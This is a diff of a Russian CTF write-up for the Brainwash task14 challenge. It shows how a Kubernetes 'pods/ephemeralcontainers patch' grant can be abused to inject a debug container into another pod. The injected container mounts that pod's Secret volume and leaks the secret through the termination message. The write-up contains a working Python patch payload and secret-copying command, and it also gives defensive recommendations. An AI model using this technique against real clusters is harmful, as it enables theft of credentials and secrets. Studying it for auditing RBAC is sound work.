@@ -1,100 +1,155 @@
-# Brainwash — task14 «Зри в корень» — разбор
+# Brainwash, часть 2 — технический разбор
 
 **Флаг:** `avito{wHa7_PaS5Es_For_trUth_1S_Eph3mERaL}`
-**Класс:** Kubernetes — эскалация через избыточные права (отладочные контейнеры) · **Сложность:** Hard (этап цепочки 13→14→15) · **Очки:** н/д · **Решило команд:** н/д
-**Автор:** @abreeva (SPbCTF)
 
-> **Это второй этап единой цепочки Brainwash (13 → 14 → 15) на одной мишени.**
-> Полный разбор всей цепочки — с логикой гипотез, разведкой и тупиками — в
-> [`../task13/brainwash_task13_writeup.md`](../task13/brainwash_task13_writeup.md)
-> (этап task14 — раздел §5).
-> Здесь — самостоятельный, но сжатый разбор именно этого этапа.
+**Класс:** Kubernetes RBAC abuse / `pods/ephemeralcontainers patch` / Secret volume exfiltration
 
-## В двух словах (без терминов)
+## Краткое техническое резюме
 
-К этому моменту (после task13) мы уже умеем выполнять команды внутри «коробки» с приложением. Оказывается, эта коробка живёт в большом «дата-центре из коробок» (Kubernetes), и у нашей коробки есть «пропуск сотрудника-робота» для входа в диспетчерскую этого дата-центра.
+Начальная позиция — RCE в Aim pod `webapp` и service account token `ci-runner`, полученные в task13.
+RBAC запрещает `get secrets`, `pods/exec` и `pods/log`, но разрешает `get/list pods` и namespace-wide
+`patch pods/ephemeralcontainers`. Это позволяет добавить ephemeral container в pod `cert-agent`,
+повторно смонтировать его Secret volume и записать `/flag.txt` в `/dev/termination-log`. Содержимое
+termination message возвращается через разрешённый `pods/get`.
 
-Смотрим, что нам этим пропуском разрешено. Читать чужие секреты и заходить в чужие коробки — нельзя. Но есть одно странное разрешение: **подсаживать в чужую коробку временного „ремонтника"**. В соседней коробке лежит секрет с флагом, читать который напрямую нам запрещено. Тогда мы подсаживаем туда «ремонтника», который берёт этот секрет и пишет его в **„записку при выходе"** — а такую записку нам как раз читать разрешено. Секрет утекает, хотя «в лоб» его прочитать было нельзя.
+Полная цепочка task13–task15 описана в
+[`../task13/brainwash_task13_writeup.md`](../task13/brainwash_task13_writeup.md).
 
----
+## 1. Контекст и цель
 
-## 1. Что за задача
+Целевой namespace — `brainwash-mlops`. Код выполняется внутри pod `webapp` от service account
+`ci-runner`. Kubernetes credentials доступны в стандартном projected volume:
 
-Прямое продолжение task13 (та же цель `https://brainwash-ztkaw810.avitoctf.ru/`, раздел `brainwash-mlops` на машине-ноде игрока). Легенда — «зри в корень» / «в каждый заглянуть»: из уже захваченного контейнера пробраться глубже в кластер Kubernetes, обойти соседние поды и достать флаг из чужого секрета.
+```text
+/var/run/secrets/kubernetes.io/serviceaccount/token
+/var/run/secrets/kubernetes.io/serviceaccount/namespace
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+```
 
-> Мини-словарь. **Kubernetes** («кубер») — «диспетчер», управляющий множеством контейнеров на машинах. **Под (pod)** — минимальная «коробка»: один или несколько контейнеров, работающих вместе. **Секрет** — защищённое хранилище паролей/ключей/файлов, которое кубер может «подкладывать» в под.
+Kubernetes API endpoint: `https://kubernetes.default.svc`. Цель — прочитать Secret, смонтированный
+как `/flag.txt` в pod `cert-agent`, без прямого доступа к Secret API и без `exec`.
 
-## 2. Разведка — что у нас уже есть
+## 2. Reconnaissance и attack surface
 
-Стартовая точка — выполнение команд (RCE) в поде `webapp` из task13. Этот под работает от «сотрудника-робота» — служебной учётки **`ci-runner`**. Внутри пода лежит его «пропуск»:
+SelfSubjectAccessReview и прямые API probes показывают следующие effective permissions principal
+`ci-runner`:
 
-- сам токен-пропуск: `/var/run/secrets/kubernetes.io/serviceaccount/token`;
-- имя раздела и корневой сертификат: `namespace`, `ca.crt` в той же папке.
+| Resource | Verb | Результат |
+|---|---|---|
+| `pods` | `get`, `list` | разрешено |
+| `pods/ephemeralcontainers` | `patch` | разрешено |
+| `pods/exec` | `create` | запрещено |
+| `pods/log` | `get` | запрещено |
+| `secrets` | `get`, `list` | запрещено |
 
-Диспетчерская кластера (API-сервер) доступна по внутреннему адресу `https://kubernetes.default.svc` — только изнутри пода. Поэтому **все запросы к кластеру идут через наш RCE-канал**, а не с внешней машины.
+`GET /api/v1/namespaces/brainwash-mlops/pods` раскрывает pod specifications и volume definitions.
+В `cert-agent` присутствует volume с `secret.secretName`, содержащим `flag`; этот volume доступен
+любому container в составе того же pod после соответствующего `volumeMount`.
 
-> Мини-словарь. **Служебная учётка** (Service Account) — «сотрудник-робот», от имени которого работает под. **Токен** — его «пропуск-карточка» для входа в диспетчерскую. **API-сервер** — «диспетчерская» кластера: единая точка, через которую всё управляется.
+## 3. Анализ и проверка гипотез
 
-## 3. Как мы дошли до решения
+Subresource `pods/ephemeralcontainers` принимает strategic merge patch с полным container spec.
+Ephemeral container не может добавить новый volume, но может смонтировать volume, уже объявленный в
+pod. Поэтому exploit переиспользует flag Secret volume `cert-agent`.
 
-- **Наблюдение.** У пода смонтирован «пропуск» — это стандартная модель: из пода можно пойти в диспетчерскую кластера и посмотреть, **где права выданы шире, чем нужно**.
-- **Проверка прав** (`../task13/pod_rbac.py`): у `ci-runner` есть `pods get/list` (смотреть список и информацию о подах) и — ключевое — **`pods/ephemeralcontainers patch`** (подсаживать «отладочный контейнер» в чужой под). А вот `exec` (зайти внутрь), `logs` (читать логи) и `get secrets` (читать секреты) — **запрещены**.
+Поскольку `pods/log` запрещён, stdout не подходит для exfiltration. Kubernetes публикует termination
+message в pod status, доступном через `pods/get`. Payload копирует Secret в
+`/dev/termination-log`, после чего container завершается.
 
-> Мини-словарь. **RBAC** — «список кто-что-может» в Kubernetes. **Эфемерный (отладочный) контейнер** — временный контейнер-«ремонтник», которого можно подсадить в уже работающий под, чтобы туда «заглянуть». **`ephemeralcontainers patch`** — право как раз такого «ремонтника» подсаживать.
+Admission policy требует restricted security context: non-root UID, запрет privilege escalation,
+drop всех Linux capabilities и `RuntimeDefault` seccomp profile.
 
-- **Тупик.** Находим соседний под **`cert-agent`** (учётка `cert-manager-sa`): в него смонтирован секрет, в имени которого есть `flag`, по пути `/flag.txt`. Но прочитать секрет напрямую — 403 (прав нет), а `exec`/`logs` нам тоже недоступны. Кажется, что до файла не добраться.
-- **Гипотеза → решение.** `ephemeralcontainers patch` — единственное разрешённое нам «активное» действие. А раз мы можем подсадить в чужой под свой временный контейнер — этот контейнер может **сам** смонтировать тот же секрет и вывести его содержимое. Только не в логи (их читать нельзя), а в **«записку при выходе» контейнера** (`/dev/termination-log`) — потому что её видно обычным `pods/get`, который нам как раз разрешён.
+## 4. Корневая причина
 
-**Бытовая аналогия «сердцевины».** Тебе запрещено открывать чужой сейф и запрещено смотреть камеры наблюдения в чужом кабинете. Но тебе разрешено **прислать в этот кабинет своего курьера** и потом **прочитать его отчёт о командировке**. Ты присылаешь курьера, он открывает сейф (ему-то в этом кабинете можно), переписывает содержимое в свой командировочный отчёт — и ты спокойно читаешь этот отчёт. Формально ни один запрет не нарушен, а секрет у тебя.
+RBAC grant на `pods/ephemeralcontainers patch` недооценён при проектировании роли `ci-runner`.
+Право позволяет выполнять attacker-controlled command в любом pod namespace и обращаться ко всем
+его volume mounts. Запрет `pods/exec`, `pods/log` и Secret API не ограничивает достигаемый эффект.
 
-## 4. В чём именно ошибка (суть уязвимости)
+Дополнительный exfiltration channel образуется комбинацией `pods/get` и termination messages:
+attacker-controlled container переносит данные в `status.ephemeralContainerStatuses`, который
+сериализуется обычным pod GET.
 
-Избыточные права у `ci-runner`: разрешение `pods/ephemeralcontainers patch` на любой под раздела — **без** `exec`/`logs`/`get secrets` — всё равно позволяет прочитать чужой смонтированный секрет. Утечка идёт по «боковому каналу»: содержимое секрета выводится в «записку при выходе» подсаженного контейнера, а её видно обычным `pods/get`.
+## 5. Эксплуатация
 
-Разработчик рассуждал так: «мы не дали читать логи и секреты — значит, под с этим правом ничего чужого не увидит». Ошибка в том, что право «подсадить контейнер» по своему реальному эффекту почти равно праву «зайти внутрь» (`exec`), просто это не очевидно из названия глагола.
+Основной patch:
 
-## 5. Эксплойт по шагам
+```python
+patch = {
+    "spec": {
+        "ephemeralContainers": [{
+            "name": ephemeral_name,
+            "image": "registry.internal.brainwash/base:v1",
+            "command": [
+                "sh",
+                "-c",
+                "(cat /flag-volume/*; echo) > /dev/termination-log 2>&1",
+            ],
+            "volumeMounts": [
+                {"name": volume, "mountPath": "/flag-volume", "readOnly": True}
+            ],
+            "terminationMessagePolicy": "File",
+            "terminationMessagePath": "/dev/termination-log",
+            "securityContext": {
+                "allowPrivilegeEscalation": False,
+                "capabilities": {"drop": ["ALL"]},
+                "runAsNonRoot": True,
+                "runAsUser": 10001,
+                "seccompProfile": {"type": "RuntimeDefault"},
+            },
+        }]
+    }
+}
+```
 
-1. Читаем «пропуск» `ci-runner`, `namespace`, `ca.crt` из `/var/run/secrets/kubernetes.io/serviceaccount/` (уже сделано в task13).
-2. Перечисляем поды (`../task13/pod_all.py`), находим `cert-agent` со смонтированным секретом (в имени есть `flag`) по пути `/flag.txt`.
-3. Подсаживаем (`PATCH`) в `cert-agent` отладочный контейнер, который выгружает секрет в «записку при выходе»:
-   ```python
-   patch = {"spec": {"ephemeralContainers": [{
-       "name": EC,
-       "image": "registry.internal.brainwash/base:v1",
-       "command": ["sh", "-c", "cat /f/* > /dev/termination-log 2>&1; sleep 2"],
-       "volumeMounts": [{"name": VOL, "mountPath": "/f", "readOnly": True}],
-       "terminationMessagePolicy": "File",
-       "terminationMessagePath": "/dev/termination-log",
-       "securityContext": {  # совместимо с политикой безопасности "restricted", иначе патч отклонят
-           "allowPrivilegeEscalation": False, "capabilities": {"drop": ["ALL"]},
-           "runAsNonRoot": True, "runAsUser": 10001, "seccompProfile": {"type": "RuntimeDefault"},
-       },
-   }]}}
-   ```
-4. Читаем `status.ephemeralContainerStatuses[].state.terminated.message` через `GET /api/v1/namespaces/{ns}/pods/{pod}` — это и есть содержимое секрета = **flag2**.
+Запросы:
 
-> Мини-словарь. **«Записка при выходе»** (termination message, `/dev/termination-log`) — короткий текст, который контейнер оставляет при завершении; его штатно видно через обычный запрос информации о поде. **`securityContext` «restricted»** — минимальные права контейнера (не root, без лишних возможностей); без этого «сторож на входе» отклонил бы наш патч.
+```text
+PATCH /api/v1/namespaces/brainwash-mlops/pods/<cert-agent>/ephemeralcontainers
+GET   /api/v1/namespaces/brainwash-mlops/pods/<cert-agent>
+```
+
+Флаг извлекается из:
+
+```text
+status.ephemeralContainerStatuses[].state.terminated.message
+```
+
+Solver предназначен для запуска внутри уже скомпрометированного Aim pod:
+
+```bash
+python3 /tmp/solve_task14.py
+```
+
+Локальная проверка логики:
+
+```bash
+uv run python task14/solve_task14.py --self-test
+```
 
 ## 6. Флаг
 
-```
+```text
 avito{wHa7_PaS5Es_For_trUth_1S_Eph3mERaL}
 ```
 
-## 7. Мораль — какой это урок
+## 7. Выводы и рекомендации
 
-- **Права нужно оценивать по достижимому эффекту, а не по „очевидному" смыслу глагола.** `ephemeralcontainers patch` звучит безобидно («ну, отладочный контейнер подсадить»), но по факту он равен возможности зайти в под и вынести из него что угодно — включая секреты, читать которые «в лоб» запрещено. Разработчик перекрыл `exec`/`logs`/`get secrets` и решил, что закрыл дверь; на деле рядом осталась незаметная равнозначная дверь.
-- **Как надо было.** Право подсаживать эфемерные контейнеры выдавать так же осторожно, как `exec`, — то есть почти никому и только на свои поды. Отдельно стоит запретить «боковой канал»: не давать `pods/get` тому, кому нельзя видеть содержимое чужих подов, либо не класть секреты в поды, где их можно вычитать через «записку при выходе».
-- **На что смотреть, чтобы не повторить.** При аудите прав в Kubernetes спрашивай не «что делает этот глагол по названию», а «какой максимальный результат достижим этим правом в связке с остальными». Часто «безобидное» разрешение в паре с другим «безобидным» даёт полный обход задуманных ограничений.
+- Классифицировать `pods/ephemeralcontainers patch` как privilege уровня `pods/exec`.
+- Ограничивать RBAC grants конкретными workload и namespace; не выдавать wildcard scope CI service
+  accounts.
+- Не размещать privileged credentials и unrelated Secret volumes в pod, доступных для debug
+  container injection.
+- Контролировать ephemeral containers admission policy и аудитировать обращения к subresource
+  `/ephemeralcontainers`.
+- Не использовать termination messages для чувствительных данных; учитывать pod status как
+  потенциальный data exfiltration channel.
 
-## 8. Файлы в папке
+## 8. Файлы для воспроизведения
 
-- `solve_task14.py` — самостоятельный решатель этапа: через Kubernetes API находит чужой Secret-volume,
-  добавляет restricted ephemeral container, пишет содержимое в termination message и читает **flag2**.
-  Он использует только stdlib и запускается внутри уже скомпрометированного в task13 Aim-пода:
-  `python3 /tmp/solve_task14.py`. Локальная проверка логики из корня:
-  `uv run python task14/solve_task14.py --self-test`.
-- [`../task13/rce_exec.py`](../task13/rce_exec.py) — готовый канал task13, через который файл можно
-  положить в `/tmp` и запустить в том же поде; отдельный набор разведочных scratch-скриптов не нужен.
-- Полный разбор всей цепочки и остальные артефакты — [`../task13/brainwash_task13_writeup.md`](../task13/brainwash_task13_writeup.md) (§5 и §8).
+Version-controlled artifacts:
+
+- `task14/solve_task14.py` — discovery Secret volume, ephemeral-container patch и чтение termination
+  message.
+- [`../task13/rce_exec.py`](../task13/rce_exec.py) — канал доставки и запуска solver внутри Aim pod.
+
+Анализ initial-access этапа: [`../task13/brainwash_task13_writeup.md`](../task13/brainwash_task13_writeup.md).
